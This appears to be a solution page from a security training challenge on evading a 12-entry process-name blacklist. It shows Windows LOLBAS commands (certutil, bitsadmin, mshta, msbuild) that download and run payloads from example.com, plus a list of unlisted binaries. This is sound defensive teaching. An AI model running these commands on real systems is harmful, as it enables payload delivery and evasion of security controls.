---
title: "Solution 04: Unlisted Tool"
difficulty: easy
category: "Process Name Evasion"
---

[Back to Challenge]({{ '/challenges/04-unlisted-tool/' | relative_url }})

## Overview

The blacklist has exactly 12 entries. Hundreds of offensive tools exist that are not listed.

## Solution

```powershell
# Tools NOT in the blacklist:
certutil.exe -urlcache -split -f http://example.com/payload.exe payload.exe
bitsadmin /transfer job http://example.com/payload.exe C:\Temp\payload.exe
mshta.exe javascript:a=GetObject("script:http://example.com/payload.sct")
wmic process call create "cmd.exe /c whoami"
cscript.exe //nologo payload.vbs
msbuild.exe payload.xml
```

## Why It Works

The blacklist approach requires knowing every possible tool in advance. Offensive tools are constantly being created, renamed, and customized. A static list of 12 names cannot keep up.

## Missing Tools

Notable absences from the blacklist: `certutil.exe`, `bitsadmin.exe`, `mshta.exe`, `wmic.exe`, `cscript.exe`, `wscript.exe`, `msbuild.exe`, `regsvr32.exe`, `rundll32.exe`, `installutil.exe`, `cmstp.exe`, `msiexec.exe`, and many more LOLBAS (Living Off The Land Binaries and Scripts).
